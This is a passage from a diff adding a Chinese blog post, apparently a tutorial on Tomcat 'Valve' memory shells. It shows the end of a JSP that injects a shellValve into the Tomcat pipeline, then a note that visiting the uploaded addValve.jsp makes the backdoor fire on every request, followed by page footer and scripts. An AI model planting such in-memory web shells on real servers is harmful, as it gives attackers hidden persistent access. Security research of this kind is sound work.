class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&lt;%</span></span><br><span class="line"><span class="language-xml">  standardContext.getPipeline().addValve(new shellValve());</span></span><br><span class="line"><span class="language-xml">  out.println(&quot;success&quot;);</span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>启动tomcat服务后，访问我们上传的<code>addValve.jsp</code>后，Vlave内存马就被成功注入，后续访问任意路径，都会触发我们的Valve内存马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740108765334-e82c69bb-b0be-466e-8eb7-a2f1fc84acae.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Sean 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="Sean 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/memShell/" rel="tag"># memShell</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/21/Listener%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Listener内存马">
+                  <i class="fa fa-angle-left"></i> Listener内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sean</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
